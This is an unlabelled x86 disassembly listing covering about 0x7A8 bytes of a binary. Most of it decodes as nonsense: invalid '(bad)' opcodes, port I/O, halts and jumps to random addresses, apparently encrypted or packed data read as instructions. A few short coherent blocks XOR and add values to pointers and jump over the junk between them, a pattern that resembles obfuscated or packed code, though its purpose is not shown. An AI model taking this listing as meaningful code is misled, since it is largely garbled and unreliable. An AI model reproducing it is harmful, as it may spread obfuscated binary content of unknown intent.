  4084d0:	in     al,dx
  4084d1:	sub    ecx,eax
  4084d3:	fcomp  QWORD PTR [esi-0x1a73f9b0]
  4084d9:	in     eax,0xf2
  4084db:	lahf   
  4084dc:	shr    BYTE PTR [ebp-0x20eaa2cf],1
  4084e2:	cmp    eax,0x3eae0a98
  4084e7:	or     DWORD PTR [ebp-0x432d1bb4],ebx
  4084ed:	lods   eax,DWORD PTR ds:[esi]
  4084ee:	and    eax,0xf43fef23
  4084f3:	pusha  
  4084f4:	repnz xchg ebp,eax
  4084f6:	loopne 0x4084e6
  4084f8:	and    dl,dl
  4084fa:	arpl   WORD PTR [esi+0x5a],ax
  4084fd:	cmp    dl,ch
  4084ff:	add    eax,0x81865611
  408504:	and    BYTE PTR ds:0x9160bb6e,bl
  40850a:	jne    0x408537
  40850c:	loop   0x408519
  40850e:	sub    ecx,DWORD PTR [edi+0x56]
  408511:	call   0x7fac741f
  408516:	pop    esp
  408517:	mov    ebp,0x7354b7e2
  40851c:	fdivr  DWORD PTR [ecx+esi*4+0x3b3d2fa8]
  408523:	cmp    al,0xdc
  408525:	enter  0x8885,0x5a
  408529:	mov    bh,0x8e
  40852b:	(bad)  [edi]
  40852d:	cmc    
  40852e:	(bad)  
  40852f:	mov    ah,0x6d
  408531:	nop
  408532:	fnsave [ebx+0x5b]
  408535:	popa   
  408536:	mov    edi,DWORD PTR [edx+0x794ed5c2]
  40853c:	mov    esi,0x9a751d32
  408541:	cmp    edx,eax
  408543:	scas   eax,DWORD PTR es:[edi]
  408544:	push   edx
  408545:	cmp    ecx,DWORD PTR [ebp+eiz*8+0x2a]
  408549:	out    dx,eax
  40854a:	(bad)  
  40854b:	rol    BYTE PTR [ecx],0xc7
  40854e:	jnp    0x408503
  408550:	std    
  408551:	mov    eax,DWORD PTR [esi-0x76]
  408554:	test   eax,0x360998cf
  408559:	(bad)  
  40855a:	aam    0x1d
  40855c:	mov    eax,0x4678738
  408561:	out    0x38,al
  408563:	push   ss
  408564:	pop    es
  408565:	add    cl,BYTE PTR ds:0xe9b637cf
  40856b:	cmp    eax,0xffd05a33
  408570:	and    al,0x64
  408572:	push   0x45411d9b
  408577:	xchg   dl,dl
  408579:	push   edi
  40857a:	inc    edx
  40857b:	and    eax,ebp
  40857d:	adc    BYTE PTR [edi-0x6f8187c9],0x83
  408584:	outs   dx,DWORD PTR ds:[esi]
  408585:	scas   eax,DWORD PTR es:[edi]
  408586:	and    BYTE PTR [ecx-0x7b],al
  408589:	and    edi,DWORD PTR [edx+0x62da5504]
  40858f:	clc    
  408590:	adc    ebx,DWORD PTR [edi]
  408592:	and    bh,al
  408594:	xor    BYTE PTR [ebp-0x6d889c70],0xd1
  40859b:	mov    ds:0x5152c18f,eax
  4085a0:	cdq    
  4085a1:	mov    dl,0x0
  4085a3:	inc    ebp
  4085a4:	int    0x2d
  4085a6:	pop    edi
  4085a7:	in     eax,0x2e
  4085a9:	hlt    
  4085aa:	sbb    BYTE PTR ds:0xda1d3ec6,ch
  4085b0:	out    0xf1,eax
  4085b2:	call   0x2bc97d8
  4085b7:	ror    DWORD PTR [edi],cl
  4085b9:	push   eax
  4085ba:	scas   al,BYTE PTR es:[edi]
  4085bb:	ret    0x5413
  4085be:	pop    esp
  4085bf:	or     BYTE PTR [ebx],al
  4085c1:	aad    0x9c
  4085c3:	vpunpcklwd ymm0,ymm1,YMMWORD PTR [edx+esi*1]
  4085c8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4085c9:	hlt    
  4085ca:	sbb    edx,eax
  4085cc:	push   es
  4085cd:	cdq    
  4085ce:	dec    esi
  4085cf:	mov    eax,0xb93fb1b8
  4085d4:	rol    ebp,0x96
  4085d7:	push   ecx
  4085d8:	fcmovu st,st(6)
  4085da:	pop    edi
  4085db:	jl     0x4085c5
  4085dd:	ret    
  4085de:	retf   
  4085df:	into   
  4085e0:	mov    bl,dl
  4085e2:	fisttp WORD PTR [ebp-0x3c]
  4085e5:	mov    al,0xeb
  4085e7:	outs   dx,DWORD PTR ds:[esi]
  4085e8:	std    
  4085e9:	sub    esi,DWORD PTR [eax+0xf1a8c4c]
  4085ef:	mov    WORD PTR [esp+ecx*4+0x4a],?
  4085f3:	jmp    0x262d:0x31528ce0
  4085fa:	icebp  
  4085fb:	data16 sub al,0x87
  4085fe:	mov    al,0x14
  408600:	push   cs
  408601:	hlt    
  408602:	xchg   ebx,eax
  408603:	cmp    ax,WORD PTR [esi-0x41]
  408607:	jo     0x408678
  408609:	dec    ecx
  40860a:	pop    esp
  40860b:	je     0x4085f2
  40860d:	push   ss
  40860e:	lahf   
  40860f:	iret   
  408610:	mov    dh,0xfa
  408612:	sub    eax,0xa54b11f4
  408617:	dec    ebp
  408618:	cmp    DWORD PTR [ebp+0x64614cd8],ebp
  40861e:	out    dx,al
  40861f:	sub    DWORD PTR [ecx+0x4a],edi
  408622:	mov    edi,0xea1d450c
  408627:	cmp    cl,al
  408629:	push   esi
  40862a:	out    0x7c,al
  40862c:	and    al,0x7f
  40862e:	pop    edx
  408630:	enter  0xc34a,0xdf
  408634:	xor    al,0x56
  408636:	(bad)  
  408637:	mov    esp,0xaad495c8
  40863c:	leave  
  40863d:	xor    al,0xec
  40863f:	jmp    0xa57f63e6
  408644:	retf   
  408645:	adc    DWORD PTR [eax],ebx
  408647:	xor    BYTE PTR [edx+0x1b8be1a4],al
  40864d:	cmc    
  40864e:	jne    0x408616
  408650:	mov    bl,0x85
  408652:	ret    0xc427
  408655:	pop    es
  408656:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408657:	ins    BYTE PTR es:[edi],dx
  408658:	inc    edi
  408659:	jb     0x4085f2
  40865b:	das    
  40865c:	push   ebx
  40865d:	adc    DWORD PTR [ecx],ecx
  40865f:	fisttp WORD PTR [edx]
  408661:	xor    esp,eax
  408663:	in     eax,dx
  408664:	out    0x5e,al
  408666:	or     esp,DWORD PTR [esi-0x332cee8b]
  40866c:	mov    edx,0x66e79bd5
  408671:	retf   0xecb4
  408674:	ret    
  408675:	or     BYTE PTR [eax+eax*8+0x35],0x8d
  40867a:	pushf  
  40867b:	popa   
  40867c:	lds    esp,FWORD PTR [ebx-0x6d]
  40867f:	xor    ebp,edi
  408681:	fwait
  408682:	xchg   edx,esi
  408684:	les    edi,FWORD PTR [edx]
  408686:	push   cs
  408687:	imul   esp,DWORD PTR [ebp*8+0x71f271ac],0x2166d773
  408692:	sbb    DWORD PTR [eax-0x701bc7b8],edi
  408698:	cld    
  408699:	fistp  QWORD PTR [ebx-0x71ed0148]
  40869f:	adc    DWORD PTR ds:0x433763,0x4336fb
  4086a9:	mov    DWORD PTR [ebp-0xc],ebx
  4086ac:	sbb    DWORD PTR ds:0x4337ef,0x433827
  4086b6:	jmp    0x4088fd
  4086bb:	pop    edi
  4086bc:	push   ebp
  4086bd:	jg     0x4086a0
  4086bf:	xor    eax,0xe8516171
  4086c4:	add    DWORD PTR [edx+0x34c4d94a],ecx
  4086ca:	out    0x8a,al
  4086cc:	(bad)  
  4086cd:	jle    0x40874d
  4086cf:	and    al,0x7c
  4086d1:	jle    0x408751
  4086d3:	dec    eax
  4086d4:	nop
  4086d5:	neg    DWORD PTR [eax+0x7279afc9]
  4086db:	es js  0x4086be
  4086de:	xchg   ebx,eax
  4086df:	imul   edx,ebx,0x73
  4086e2:	test   DWORD PTR [edi+0x40],esp
  4086e5:	mov    eax,ds:0x2d33bfa4
  4086ea:	fcom   QWORD PTR [esi+0x44]
  4086ed:	xchg   edx,eax
  4086ee:	jecxz  0x4086d6
  4086f0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4086f1:	add    DWORD PTR [ebx],eax
  4086f3:	pushf  
  4086f4:	sub    ebx,DWORD PTR [ecx-0x6a]
  4086f7:	pop    esi
  4086f8:	lods   al,BYTE PTR ds:[esi]
  4086f9:	mov    al,ds:0xaa286e5b
  4086fe:	fcmovnu st,st(2)
  408700:	js     0x408752
  408702:	fwait
  408703:	out    0x7b,eax
  408705:	pop    es
  408706:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408707:	mov    al,0xf2
  408709:	add    edi,edi
  40870b:	pop    esi
  40870c:	jbe    0x40871c
  40870e:	mov    ds:0xe9908260,al
  408713:	aam    0xeb
  408715:	or     al,0x9c
  408717:	add    bl,ah
  408719:	sbb    edi,DWORD PTR [edi+0x45fe86c3]
  40871f:	cdq    
  408720:	mov    eax,ds:0x87d10694
  408725:	xor    DWORD PTR [ebx+0x1a],ebx
  408728:	sbb    al,0xf7
  40872a:	xchg   esi,eax
  40872b:	ja     0x408724
  40872d:	inc    edi
  40872e:	pop    ds
  40872f:	cs loop 0x40875f
  408732:	add    edx,edx
  408734:	xchg   edx,eax
  408735:	mov    dl,0x94
  408737:	pop    esi
  408738:	sar    DWORD PTR [esi-0x70],1
  40873b:	and    eax,0x75b3de3e
  408740:	inc    esi
  408741:	neg    ah
  408743:	call   0xece21142
  408748:	xchg   esp,eax
  408749:	mov    dh,0xf
  40874b:	fist   WORD PTR [eax-0x18f145b5]
  408751:	retf   
  408752:	loop   0x4086d5
  408754:	retf   
  408755:	cdq    
  408756:	inc    ebx
  408757:	push   cs
  408758:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408759:	ins    DWORD PTR es:[edi],dx
  40875a:	sub    BYTE PTR [edi-0x2a05bcc0],ah
  408760:	push   eax
  408761:	je     0x4086f0
  408763:	bound  esp,QWORD PTR [ebx+0x11]
  408766:	and    BYTE PTR [ebx-0x2e019627],bh
  40876c:	arpl   WORD PTR [edx+0x3a],di
  40876f:	push   0xc80ef643
  408774:	ins    BYTE PTR es:[edi],dx
  408775:	loop   0x4087f0
  408777:	inc    edi
  408778:	pop    ecx
  408779:	stc    
  40877a:	arpl   WORD PTR ds:0xa75eedd7,di
  408780:	retf   
  408781:	int    0x5d
  408783:	ret    0x6fbb
  408786:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408787:	bound  ecx,QWORD PTR [edi]
  408789:	inc    edx
  40878a:	gs inc edi
  40878c:	dec    esi
  40878d:	stc    
  40878e:	inc    edi
  40878f:	jne    0x4087cf
  408791:	pop    ebp
  408792:	pop    ebx
  408793:	sbb    DWORD PTR [esi],eax
  408795:	lods   al,BYTE PTR ds:[esi]
  408796:	inc    edi
  408797:	rol    BYTE PTR ds:0xea1dd90c,1
  40879d:	fadd   QWORD PTR [ebx]
  40879f:	mov    edi,DWORD PTR ds:0xff007e78
  4087a5:	repz sbb dh,bh
  4087a8:	imul   BYTE PTR [esi-0x51]
  4087ab:	mov    ah,cl
  4087ad:	or     edx,0xd9f86205
  4087b3:	adc    ebx,DWORD PTR [eax+0x15971720]
  4087b9:	and    BYTE PTR [ebp-0x14914f97],0x97
  4087c0:	xchg   ebp,eax
  4087c1:	mov    cs,edx
  4087c3:	jecxz  0x408784
  4087c5:	test   BYTE PTR [ecx],al
  4087c7:	scas   al,BYTE PTR es:[edi]
  4087c8:	dec    esp
  4087c9:	and    bl,BYTE PTR [ebp-0x1ac8fcf0]
  4087cf:	loopne 0x4087d7
  4087d1:	icebp  
  4087d2:	cld    
  4087d3:	out    dx,eax
  4087d4:	adc    BYTE PTR [ebp-0x3946475b],0x1b
  4087db:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4087dc:	or     ah,BYTE PTR [ecx]
  4087de:	test   esi,0x2e55d436
  4087e4:	inc    edi
  4087e5:	push   ecx
  4087e6:	and    al,0x8
  4087e8:	inc    esi
  4087e9:	jg     0x40879f
  4087eb:	inc    esi
  4087ec:	ret    0x61a8
  4087ef:	push   ecx
  4087f0:	sahf   
  4087f1:	lds    edx,FWORD PTR fs:[edx+0x61]
  4087f5:	pop    esp
  4087f6:	sub    ecx,edx
  4087f8:	fsubrp st(4),st
  4087fa:	into   
  4087fb:	sub    eax,0x38fa0b24
  408800:	bound  edi,QWORD PTR [ecx]
  408802:	push   ds
  408803:	mov    DWORD PTR [eax+0x548a6be3],0x61499ecf
  40880d:	push   ebx
  40880e:	stos   BYTE PTR es:[edi],al
  40880f:	cmp    al,BYTE PTR [esi-0x5dae90f6]
  408815:	jmp    FWORD PTR [ebp-0x55]
  408818:	adc    ecx,DWORD PTR [edi-0x29]
  40881b:	les    esp,FWORD PTR [ecx]
  40881d:	sbb    al,0x8f
  40881f:	jne    0x4087b4
  408821:	fdivr  DWORD PTR ds:0xc39caa5
  408827:	iret   
  408828:	mov    dh,0x4a
  40882a:	loopne 0x408862
  40882c:	mov    ds:0x29a901bd,al
  408831:	xor    al,0xfe
  408833:	call   0xe648a3b4
  408838:	push   0x3e
  40883a:	(bad)  
  40883c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40883d:	xchg   esi,eax
  40883e:	lea    ebp,[ecx-0x28]
  408841:	sub    ebx,DWORD PTR [eax]
  408843:	out    0x4,al
  408845:	in     eax,0xd4
  408847:	test   al,0x80
  408849:	and    eax,DWORD PTR [esi-0x4d]
  40884c:	retfw  
  40884e:	std    
  40884f:	fsub   QWORD PTR [ebx-0x3b]
  408852:	mov    edx,0x2656d129
  408857:	xchg   ebx,eax
  408858:	gs cdq 
  40885a:	sub    dl,BYTE PTR [edx+ebx*8]
  40885d:	xor    BYTE PTR [edi+ebp*2-0x5],0x68
  408862:	push   0x4b44cdcc
  408867:	ds leave 
  408869:	out    dx,eax
  40886a:	mov    ds:0x84722277,al
  40886f:	lods   eax,DWORD PTR ds:[esi]
  408870:	jo     0x40881a
  408872:	dec    esp
  408873:	outs   dx,BYTE PTR ds:[esi]
  408874:	shl    dh,0x33
  408877:	adc    eax,0x3870a171
  40887c:	add    edx,ecx
  40887e:	jg     0x40886b
  408880:	xchg   edi,eax
  408881:	push   edx
  408882:	sbb    ch,cl
  408884:	inc    edi
  408885:	leave  
  408886:	mov    edi,0xd0b642fe
  40888b:	adc    BYTE PTR [eax],0x9d
  40888e:	lock aad 0x11
  408891:	(bad)  
  408893:	push   cs
  408894:	mov    eax,ds:0x622c52af
  408899:	cmp    BYTE PTR [ebx],bh
  40889b:	push   0x44
  40889d:	retf   0x603b
  4088a0:	push   0x9
  4088a2:	clc    
  4088a3:	psubw  mm2,QWORD PTR [edi]
  4088a6:	jmp    0x4088d7
  4088a8:	dec    ebx
  4088a9:	aam    0xd7
  4088ab:	pop    es
  4088ac:	xchg   edi,eax
  4088ad:	inc    esp
  4088ae:	and    al,0xb8
  4088b0:	movd   mm5,eax
  4088b3:	outs   dx,DWORD PTR ds:[esi]
  4088b4:	rol    ah,0x24
  4088b7:	inc    ebx
  4088b8:	aaa    
  4088b9:	(bad)  
  4088ba:	sub    al,0x64
  4088bc:	fdivp  st(7),st
  4088be:	add    DWORD PTR [eax+0x2f],eax
  4088c1:	pop    edi
  4088c2:	(bad)  
  4088c4:	and    BYTE PTR [eax-0x30],cl
  4088c7:	mov    BYTE PTR [edi+0x48],bl
  4088ca:	inc    edx
  4088cb:	and    esi,DWORD PTR [eax+0x6b]
  4088ce:	cld    
  4088cf:	cmp    BYTE PTR [ebp-0x11],ch
  4088d2:	xchg   edi,eax
  4088d3:	jecxz  0x408911
  4088d5:	out    0x59,al
  4088d7:	ffree  st(4)
  4088d9:	rcl    DWORD PTR [edx+0x50],1
  4088dc:	int3   
  4088dd:	xlat   BYTE PTR ds:[ebx]
  4088de:	aad    0xee
  4088e0:	int3   
  4088e1:	mov    edi,0x16289a51
  4088e6:	sub    BYTE PTR [ebx+ebx*8],0xe
  4088ea:	out    dx,eax
  4088eb:	push   ss
  4088ec:	lea    edi,[edx-0x1b0f4ff1]
  4088f2:	inc    esi
  4088f3:	pop    ss
  4088f4:	cmp    cl,BYTE PTR [esi+edi*2+0x7ec4b07f]
  4088fb:	(bad)  
  4088fc:	ror    DWORD PTR [ebx+0x63358100],1
  408902:	aaa    
  408903:	inc    ebx
  408904:	add    BYTE PTR [edx],ch
  408906:	jl     0x408908
  408908:	add    BYTE PTR [esi-0x75],ah
  40890b:	dec    ebp
  40890c:	cld    
  40890d:	adc    DWORD PTR ds:0x4337db,0x67a8
  408917:	movzx  ecx,cx
  40891a:	xor    DWORD PTR ds:0x433753,0x1847
  408924:	add    ecx,DWORD PTR [eax]
  408926:	not    DWORD PTR ds:0x43371f
  40892c:	mov    DWORD PTR [ebp-0x18],ecx
  40892f:	mov    eax,DWORD PTR [ebp+0x8]
  408932:	or     DWORD PTR ds:0x433827,ebx
  408938:	mov    ecx,DWORD PTR [ebp-0x8]
  40893b:	xor    eax,esi
  40893d:	add    eax,edi
  40893f:	cmp    DWORD PTR [ecx],eax
  408941:	jne    0x408e5a
  408947:	dec    ecx
  408948:	mov    eax,DWORD PTR [ebp+0x8]
  40894b:	mov    ecx,DWORD PTR [ebp-0x18]
  40894e:	xor    eax,esi
  408950:	add    eax,edi
  408952:	cmp    DWORD PTR [ecx],eax
  408954:	jmp    0x408b9b
  408959:	stos   BYTE PTR es:[edi],al
  40895a:	adc    edx,esi
  40895c:	inc    ebx
  40895d:	jno    0x4089c0
  40895f:	stos   DWORD PTR es:[edi],eax
  408960:	icebp  
  408961:	jl     0x4089b5
  408963:	and    eax,0xe795e12c
  408968:	retf   
  408969:	mov    al,0xd4
  40896b:	jle    0x4089eb
  40896d:	and    al,0x7c
  40896f:	jle    0x4089ef
  408971:	into   
  408972:	outs   dx,DWORD PTR ds:[esi]
  408973:	or     eax,0xaf1e3672
  408978:	inc    edx
  408979:	sahf   
  40897a:	add    ebx,0xc
  40897d:	mov    bl,0xc3
  40897f:	rol    DWORD PTR [ecx-0x2f1908e0],1
  408985:	loope  0x408994
  408987:	fucomp st(7)
  408989:	jecxz  0x408a04
  40898b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40898c:	jns    0x408966
  40898e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40898f:	jnp    0x408931
  408991:	inc    ecx
  408992:	mov    dh,0xe1
  408994:	or     bh,cl
  408996:	ret    0x8fb8
  408999:	nop
  40899a:	jb     0x4089c1
  40899c:	xor    ah,ah
  40899e:	cmp    BYTE PTR [eax+0xb],al
  4089a1:	out    dx,eax
  4089a2:	cmp    DWORD PTR [eax+ebx*8],0xffffffb8
  4089a6:	pop    esp
  4089a7:	lds    ebp,FWORD PTR [edi]
  4089a9:	inc    edx
  4089aa:	retf   
  4089ab:	pop    esi
  4089ac:	div    esi
  4089ae:	pop    ebx
  4089af:	iret   
  4089b0:	int3   
  4089b1:	out    dx,eax
  4089b2:	dec    esi
  4089b3:	int    0xc9
  4089b5:	aam    0xa1
  4089b7:	add    eax,0x5b80adf7
  4089bc:	pop    es
  4089bd:	outs   dx,DWORD PTR ds:[esi]
  4089be:	or     cl,BYTE PTR ds:0x59781a0e
  4089c4:	dec    esi
  4089c5:	pop    edi
  4089c6:	inc    ebx
  4089c8:	or     al,0xa6
  4089ca:	out    0xfc,al
  4089cc:	cwde   
  4089cd:	lahf   
  4089ce:	outs   dx,BYTE PTR ds:[esi]
  4089cf:	repnz mov al,ds:0xcfb274b9
  4089d5:	inc    eax
  4089d6:	ins    BYTE PTR es:[edi],dx
  4089d7:	shr    BYTE PTR [ecx],cl
  4089d9:	cwde   
  4089da:	rcl    DWORD PTR [edi-0x60a5dc4],1
  4089e0:	ins    DWORD PTR es:[edi],dx
  4089e1:	aad    0x27
  4089e3:	xor    ecx,edi
  4089e5:	iret   
  4089e6:	dec    ecx
  4089e7:	mov    ebp,0x227c48cf
  4089ec:	jnp    0x408974
  4089ee:	adc    eax,0xd762f1c3
  4089f3:	(bad)  
  4089f4:	and    DWORD PTR ss:[ebp+0x52b6608c],ecx
  4089fb:	adc    al,0x1d
  4089fd:	push   esi
  4089fe:	xchg   ebp,eax
  4089ff:	mov    dl,0x37
  408a01:	xor    eax,0x59ebdaf
  408a06:	or     BYTE PTR [ebx-0x7656737e],cl
  408a0c:	jo     0x4089bb
  408a0e:	test   DWORD PTR [eax+0x47580a74],ebx
  408a14:	shl    cl,0xed
  408a17:	mov    ds:0x7d031146,al
  408a1c:	rcl    eax,cl
  408a1e:	jmp    0x408a83
  408a20:	scas   eax,DWORD PTR es:[edi]
  408a21:	xchg   ebx,eax
  408a22:	lods   eax,DWORD PTR ds:[esi]
  408a23:	pop    eax
  408a24:	xchg   edi,eax
  408a25:	out    dx,al
  408a26:	pushf  
  408a27:	dec    ecx
  408a28:	lahf   
  408a29:	lock adc BYTE PTR [ecx+0x63030a95],ch
  408a30:	ds pop eax
  408a32:	xor    DWORD PTR [edx-0x3d],esi
  408a35:	adc    BYTE PTR [ebx],bh
  408a37:	xchg   ebp,eax
  408a38:	into   
  408a39:	(bad)  
  408a3a:	into   
  408a3b:	pop    edx
  408a3c:	gs in  eax,0xdd
  408a3f:	sbb    DWORD PTR [edi-0x64746f5],eax
  408a45:	and    al,0xf6
  408a47:	outs   dx,DWORD PTR ds:[esi]
  408a48:	xor    BYTE PTR [ebx-0x72],ch
  408a4b:	and    bl,BYTE PTR [ebp-0x7b]
  408a4e:	pop    dx
  408a50:	or     dl,BYTE PTR [esi]
  408a52:	mov    ch,BYTE PTR ds:[esi+0x1123da41]
  408a59:	sub    ebp,ecx
  408a5b:	repz cli 
  408a5d:	or     DWORD PTR [ebx-0x1b881ee2],eax
  408a63:	shr    DWORD PTR ds:0xe9ef0023,0x18
  408a6a:	jp     0x408aaf
  408a6c:	push   esi
  408a6d:	fmul   DWORD PTR [esi-0x368379d7]
  408a73:	dec    esp
  408a74:	in     al,0x9c
  408a76:	sub    dl,BYTE PTR [esp+ebp*2-0x4c8c4156]
  408a7d:	pushf  
  408a7e:	loopne 0x408a43
  408a80:	bound  edx,QWORD PTR [edx-0x6]
  408a83:	adc    BYTE PTR [ebx-0x11],bh
  408a86:	dec    edi
  408a87:	outs   dx,DWORD PTR fs:[esi]
  408a89:	xchg   esi,eax
  408a8a:	pop    ss
  408a8b:	stc    
  408a8c:	sti    
  408a8d:	sub    al,0x5b
  408a8f:	push   ss
  408a90:	cld    
  408a91:	daa    
  408a92:	repnz outs dx,DWORD PTR ds:[esi]
  408a94:	push   esi
  408a95:	jmp    DWORD PTR [ecx-0x42]
  408a98:	fdivr  QWORD PTR [ecx]
  408a9a:	and    ch,BYTE PTR [ebx-0x69]
  408a9d:	(bad)  
  408a9e:	xor    al,0xb2
  408aa0:	hlt    
  408aa1:	scas   al,BYTE PTR es:[edi]
  408aa2:	(bad)  
  408aa3:	int    0xf6
  408aa5:	jbe    0x408ad5
  408aa7:	retf   
  408aa8:	pop    ebp
  408aa9:	ins    BYTE PTR es:[edi],dx
  408aaa:	popa   
  408aab:	fs out dx,eax
  408aad:	out    dx,al
  408aae:	xor    DWORD PTR [eax+eax*4],ecx
  408ab1:	test   edx,0xc177e648
  408ab7:	cmp    DWORD PTR [esi],ebx
  408ab9:	and    cl,BYTE PTR [eax-0x7bba0928]
  408abf:	loop   0x408b3c
  408ac1:	pop    ebp
  408ac2:	jmp    0x408aa0
  408ac4:	cmp    eax,0x150b74d2
  408ac9:	loop   0x408ac4
  408acb:	cwde   
  408acc:	inc    eax
  408acd:	(bad)  
  408ace:	das    
  408acf:	sbb    ebp,DWORD PTR [esi+0x1c]
  408ad2:	jo     0x408b3f
  408ad4:	ret    0x8c27
  408ad7:	add    al,0xf7
  408ad9:	cmp    al,0x56
  408adb:	(bad)  
  408adc:	mov    al,0xab
  408ade:	jae    0x408aa4
  408ae0:	xchg   BYTE PTR [ebp-0x7cbc8fd],bh
  408ae6:	lock rcl DWORD PTR [edx],0xab
  408aea:	push   esp
  408aeb:	sub    ch,BYTE PTR [eax]
  408aed:	push   eax
  408aee:	mov    ds:0xce2c4bd0,eax
  408af3:	pop    ebp
  408af4:	cmp    al,0x55
  408af6:	cwde   
  408af7:	loope  0x408b20
  408af9:	je     0x408a93
  408afb:	cmp    ebx,DWORD PTR [esi]
  408afd:	jae    0x408b4f
  408aff:	inc    edx
  408b00:	sbb    al,0x16
  408b02:	les    esp,FWORD PTR [eax]
  408b04:	hlt    
  408b05:	je     0x408afc
  408b07:	test   DWORD PTR ds:0xc37beae9,eax
  408b0d:	(bad)  
  408b0e:	push   ebx
  408b0f:	mov    eax,0x565b1cd
  408b14:	pushf  
  408b15:	shr    BYTE PTR [ecx-0x7497e850],1
  408b1b:	cmc    
  408b1c:	adc    dl,BYTE PTR [edi+0x4c]
  408b1f:	nop
  408b20:	cmp    al,0x6c
  408b22:	fwait
  408b23:	cdq    
  408b24:	test   DWORD PTR [ebp+0x3d],eax
  408b27:	xor    ebp,ecx
  408b29:	sbb    al,0xe5
  408b2b:	pop    ebx
  408b2c:	jb     0x408b25
  408b2e:	jb     0x408aba
  408b30:	mov    WORD PTR [eax-0xecedf8d],ss
  408b36:	div    BYTE PTR [ebx-0xea0ccb8]
  408b3c:	push   ecx
  408b3d:	push   0x5d7dceb
  408b42:	push   0xffffffc2
  408b44:	scas   eax,DWORD PTR es:[edi]
  408b45:	mov    bl,0xcc
  408b47:	and    eax,ebx
  408b49:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408b4a:	mov    DWORD PTR [edi],ecx
  408b4c:	shr    ch,1
  408b4e:	mov    al,ds:0x999c66ed
  408b53:	adc    esp,DWORD PTR [ebx]
  408b55:	or     DWORD PTR [esi],ebx
  408b57:	jmp    0x78cd0331
  408b5c:	popf   
  408b5d:	imul   ebp,ecx,0x15
  408b60:	inc    edx
  408b61:	xchg   esp,eax
  408b62:	jge    0x408b41
  408b64:	out    dx,al
  408b65:	sbb    eax,0x80acf17b
  408b6a:	enter  0x4f9a,0xf
  408b6e:	adc    esi,DWORD PTR [edx-0xdf98786]
  408b74:	mov    eax,0x83a7215c
  408b79:	mov    WORD PTR [esp+ecx*4+0x54],es
  408b7d:	add    esi,DWORD PTR [ebx+ebx*4-0x2a]
  408b81:	xchg   edx,eax
  408b82:	inc    edi
  408b83:	or     eax,0xa65eaf5e
  408b88:	sub    ah,BYTE PTR [ebx+0x4110fc45]
  408b8e:	mov    ebx,0x84d656d1
  408b93:	jno    0x408b1b
  408b95:	xor    ebp,DWORD PTR [edi]
  408b97:	mov    cl,0xe6
  408b99:	xor    eax,0x1d850f62
  408b9e:	add    BYTE PTR [eax],al
  408ba0:	add    BYTE PTR [ebx+0x4d8b0845],cl
  408ba6:	lock xor eax,esi
  408ba9:	add    eax,edi
  408bab:	mov    DWORD PTR [ecx],eax
  408bad:	mov    eax,DWORD PTR [ebp-0x10]
  408bb0:	mov    ecx,DWORD PTR [ebp+0x10]
  408bb3:	xor    ecx,esi
  408bb5:	mov    edx,0xffcd8d65
  408bba:	sub    edx,ecx
  408bbc:	add    DWORD PTR [eax],edx
  408bbe:	mov    eax,ds:0x413c08
  408bc3:	mov    eax,DWORD PTR [eax]
  408bc5:	mov    cx,WORD PTR [ebp-0x4]
  408bc9:	movzx  ecx,cx
  408bcc:	add    ecx,DWORD PTR [eax]
  408bce:	mov    DWORD PTR [ebp-0x18],ecx
  408bd1:	mov    eax,DWORD PTR [ebp+0xc]
  408bd4:	mov    ecx,DWORD PTR [ebp+0xc]
  408bd7:	xor    eax,esi
  408bd9:	add    eax,eax
  408bdb:	xor    ecx,esi
  408bdd:	sub    ecx,eax
  408bdf:	jmp    0x408e26
  408be4:	xchg   ebx,eax
  408be5:	or     BYTE PTR [esi+0x73709572],cl
  408beb:	jmp    0x946e656d
  408bf0:	mov    ch,0x97
  408bf2:	push   ecx
  408bf3:	aaa    
  408bf4:	data16 sar BYTE PTR [esi+0x7e],cl
  408bf8:	and    al,0x7c
  408bfa:	jle    0x408c7a
  408bfc:	pop    ebx
  408bfd:	dec    eax
  408bfe:	mov    ah,0x5d
  408c00:	inc    ecx
  408c01:	push   edx
  408c02:	pop    ebp
  408c03:	cld    
  408c04:	add    ah,dh
  408c06:	shl    BYTE PTR [esi+0x1b081402],cl
  408c0c:	pusha  
  408c0d:	(bad)  
  408c0e:	retf   
  408c0f:	mov    esp,0x8baaf122
  408c14:	arpl   WORD PTR [ebx],cx
  408c16:	pop    eax
  408c17:	xchg   esi,eax
  408c18:	int3   
  408c19:	push   ebp
  408c1a:	push   edi
  408c1b:	pushf  
  408c1c:	sbb    cl,0x2c
  408c1f:	and    dl,dl
  408c21:	loope  0x408c40
  408c23:	dec    ebx
  408c24:	je     0x408c93
  408c26:	sub    DWORD PTR [edx+ebp*4-0x6a],ebx
  408c2a:	mov    ah,0x36
  408c2c:	scas   al,BYTE PTR es:[edi]
  408c2d:	not    BYTE PTR [esp+ebx*8-0x8ba71bd]
  408c34:	push   0xffffff87
  408c36:	cmp    al,0x63
  408c38:	mov    cs,WORD PTR [ebx-0x7e]
  408c3b:	aaa    
  408c3c:	es inc ebp
  408c3e:	rol    esi,0x42
  408c41:	xor    BYTE PTR ds:0x4acbbac3,bh
  408c47:	jmp    0x408c2d
  408c49:	dec    ecx
  408c4a:	pop    es
  408c4b:	(bad)  
  408c4c:	xor    bl,bl
  408c4e:	(bad)  
  408c4f:	ins    DWORD PTR es:[edi],dx
  408c50:	push   0x5b
  408c52:	inc    eax
  408c53:	mov    WORD PTR [ecx-0x5b168d5b],gs
  408c59:	fisttp QWORD PTR [ecx]
  408c5b:	add    DWORD PTR [edi],ecx
  408c5d:	add    ah,BYTE PTR [eax]
  408c5f:	clc    
  408c60:	rcl    BYTE PTR [edx],cl
  408c62:	xchg   edx,eax
  408c63:	mov    ecx,0x643a3bf7
  408c68:	loope  0x408cd9
  408c6a:	or     al,0xa3
  408c6c:	pop    ss
  408c6d:	enter  0x20e5,0x74
  408c71:	jecxz  0x408c4d
  408c73:	push   ebp
  408c74:	fnstcw WORD PTR [esp+ebx*1-0x5a]
  408c78:	pop    esi
